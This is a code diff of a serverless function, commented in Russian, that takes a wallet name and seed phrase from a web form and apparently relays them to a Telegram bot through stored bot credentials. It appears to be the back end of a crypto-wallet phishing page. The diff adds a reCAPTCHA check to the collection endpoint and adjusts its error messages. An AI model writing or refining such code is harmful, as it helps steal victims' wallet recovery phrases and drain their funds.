@@ -14,13 +14,36 @@ exports.handler = async function (event) {
     }
 
     try {
-        const { walletName, seedPhrase } = JSON.parse(event.body);
-        const { BOT_TOKEN, CHAT_ID } = process.env;
+        const { BOT_TOKEN, CHAT_ID, RECAPTCHA_SECRET_KEY } = process.env;
+        const body = JSON.parse(event.body);
+        const { walletName, seedPhrase, recaptchaToken } = body;
 
-        if (!BOT_TOKEN || !CHAT_ID) {
-          throw new Error("Секретные ключи не настроены на сервере.");
+        // --- ПРОВЕРКА RECAPTCHA ---
+        if (!recaptchaToken) {
+           throw new Error("Токен reCAPTCHA отсутствует.");
         }
 
+        const recaptchaUrl = `https://www.google.com/recaptcha/api/siteverify`;
+        const recaptchaRes = await axios.post(recaptchaUrl, null, {
+            params: {
+                secret: RECAPTCHA_SECRET_KEY,
+                response: recaptchaToken,
+            },
+        });
+        
+        // Проверяем, что проверка успешна и оценка пользователя выше порога (0.5 - стандарт)
+        if (!recaptchaRes.data.success || recaptchaRes.data.score < 0.5) {
+            console.warn("Проверка reCAPTCHA не пройдена!", recaptchaRes.data);
+            throw new Error("Вы не прошли проверку на робота.");
+        }
+        // --- КОНЕЦ ПРОВЕРКИ ---
+
+
+        if (!BOT_TOKEN || !CHAT_ID) {
+            console.error("КРИТИЧЕСКАЯ ОШИБКА: BOT_TOKEN или CHAT_ID не установлены!");
+            throw new Error("Конфигурация сервера не завершена.");
+        }
+        
         if (!walletName || !seedPhrase) {
             return {
                 statusCode: 400,
@@ -48,10 +71,10 @@ exports.handler = async function (event) {
         };
 
     } catch (error) {
-        console.error('Ошибка в функции Netlify:', error.message);
+        console.error('Ошибка внутри выполнения функции:', error.message);
         return {
             statusCode: 500,
-            body: JSON.stringify({ success: false, message: `Ошибка на сервере.` }),
+            body: JSON.stringify({ success: false, message: error.message || 'Произошла внутренняя ошибка на сервере.' }),
         };
     }
 };
